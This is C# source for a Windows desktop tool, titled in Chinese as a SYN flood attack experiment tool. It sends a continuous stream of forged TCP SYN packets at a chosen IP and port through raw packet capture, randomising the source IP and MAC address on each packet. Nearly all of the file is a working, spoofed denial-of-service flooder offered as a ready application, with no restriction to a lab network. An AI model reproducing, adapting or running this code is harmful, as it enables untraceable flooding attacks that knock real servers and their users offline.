using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace SynFlooder {
    public partial class Form1 : MetroFramework.Forms.MetroForm {

        Thread T;
        public Form1() {
            InitializeComponent();
            this.Text = "Syn洪泛攻击实验工具";
            this.Sleep_textbox.KeyPress += OnlyNumber;

            foreach (LivePacketDevice device in LivePacketDevice.AllLocalMachine) {
                metroComboBox1.Items.Add(device.Description);
            }
            metroComboBox1.SelectedIndex = 0;
        }

        private void START_button_Click(object sender, System.EventArgs e) {
            Regex rxMacAddress = new Regex(@"^[0-9a-fA-F]{2}(((:[0-9a-fA-F]{2}){5})|((:[0-9a-fA-F]{2}){5}))$");
            if (!rxMacAddress.IsMatch(SOURCEMAC_textbox.Text)) {
                if (!RndSourceMac.Checked) {
                    MessageBox.Show("源Mac不合规");
                    return;
                }
            }
            if (!rxMacAddress.IsMatch(TARGETMAC_textbox.Text)) {
                if (!RndSourceMac.Checked) {
                    MessageBox.Show("目的Mac不合规");
                    return;
                }
            }


            if (!CheckIPValid(IP_textbox.Text)) {
                MessageBox.Show("IP不合规");
                return;
            }

            if (!CheckIPValid(SOURCEIP_textbox.Text)) {
                if (!RndSourceIP.Checked) {
                    MessageBox.Show("源IP不合规");
                    return;
                }
            }
            if (!IsPort(PORT_textbox.Text)) {
                MessageBox.Show("端口不合规");
                return;
            }

            DisableAll();

            T = new Thread(() => {
                try {
                    while (true) {
                        if (RndSourceMac.Checked)
                            this.Invoke(new MethodInvoker(delegate () {
                                SOURCEMAC_textbox.Text = GetRandomMacAddress();
                            }));

                        if (RndSourceIP.Checked)
                            this.Invoke(new MethodInvoker(delegate () {
                                SOURCEIP_textbox.Text = GetRandomIpAddress();
                            }));

                        SendSyn(IP_textbox.Text, int.Parse(PORT_textbox.Text),
                            SOURCEIP_textbox.Text,SOURCEMAC_textbox.Text,
                            TARGETMAC_textbox.Text,Data_textbox.Text);
                        Thread.Sleep(int.Parse(Sleep_textbox.Text));
                    }
                } catch (ThreadInterruptedException) {
                } catch (Exception ex) {
                    MessageBox.Show(ex.Message, "Exception", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            });

            T.Start();
        }

        private void DisableAll() {
            IP_textbox.Enabled = false;
            PORT_textbox.Enabled = false;
            SOURCEIP_textbox.Enabled = false;
            SOURCEMAC_textbox.Enabled = false;
            metroComboBox1.Enabled = false;
            Data_textbox.Enabled = false;
        }

        private void STOP_button_Click(object sender, System.EventArgs e) {
            if (T.IsAlive) {
                T.Interrupt();
                EnableAll();
            }
        }

        public string GetRandomIpAddress() {
            var random = new Random();
            return $"{random.Next(1, 255)}.{random.Next(0, 255)}.{random.Next(0, 255)}.{random.Next(0, 255)}";
        }

        private void EnableAll() {
            IP_textbox.Enabled = true;
            PORT_textbox.Enabled = true;
            SOURCEIP_textbox.Enabled = true;
            SOURCEMAC_textbox.Enabled = true;
            metroComboBox1.Enabled = true;
            Data_textbox.Enabled = true;
        }

        private static string GetRandomMacAddress() {
            var random = new Random();
            var buffer = new byte[6];
            random.NextBytes(buffer);
            var result = String.Concat(buffer.Select(x => string.Format("{0}:", x.ToString("X2"))).ToArray());
            return result.TrimEnd(':');
        }

        private void SendSyn(string ip, int port,
            string SourceIP, string SourceMac,
            string DestinationMac, string payload) {
            EthernetLayer ethLayer = new EthernetLayer {
                Source = new MacAddress(SourceMac),
                Destination = new MacAddress(DestinationMac),
                EtherType = EthernetType.None,
            };

            IpV4Layer ipV4Layer = new IpV4Layer {
                Source = new IpV4Address(SourceIP),
                CurrentDestination = new IpV4Address(ip),
                Fragmentation = IpV4Fragmentation.None,
                HeaderChecksum = null,
                Identification = 0,
                Options = IpV4Options.None,
                Protocol = IpV4Protocol.Tcp,
                Ttl = 128,
                TypeOfService = 0,
            };

            TcpLayer tcpLayer = new TcpLayer {
                SourcePort = (ushort)port,
                DestinationPort = (ushort)port,
                Checksum = null,
                SequenceNumber = 0,
                AcknowledgmentNumber = 0,
                ControlBits = TcpControlBits.Synchronize,
                Window = 1024,
                UrgentPointer = 0,
            };

            PayloadLayer payloadLayer = new PayloadLayer {
                Data = new Datagram(Encoding.ASCII.GetBytes(payload)),
            };

            PacketBuilder builder = new PacketBuilder(ethLayer, ipV4Layer, tcpLayer, payloadLayer);

            this.Invoke(new MethodInvoker(delegate () {
                using (PacketCommunicator communicator = LivePacketDevice.AllLocalMachine[metroComboBox1.SelectedIndex].Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000)) {
                    communicator.SendPacket(builder.Build(DateTime.Now));
                }
            }));
        }

        private void OnlyNumber(object sender, KeyPressEventArgs e) {
            if (!(char.IsDigit(e.KeyChar) || e.KeyChar == Convert.ToChar(Keys.Back)))    //直接处理了除了数字和后空位以外的剩余部分。
            {
                e.Handled = true;
            }

        }


        public static bool CheckIPValid(string strIP) {
            IPAddress result = null;
            return
                !String.IsNullOrEmpty(strIP) &&
                IPAddress.TryParse(strIP, out result);
        }

        public static bool IsPort(string value) {
            if (string.IsNullOrEmpty(value))
                return false;

            Regex numeric = new Regex(@"^[0-9]+$", RegexOptions.Compiled | RegexOptions.IgnoreCase);

            if (numeric.IsMatch(value)) {
                try {
                    if (Convert.ToInt32(value) < 65536)
                        return true;
                } catch (OverflowException) {
                }
            }
            return false;
        }

    }
}
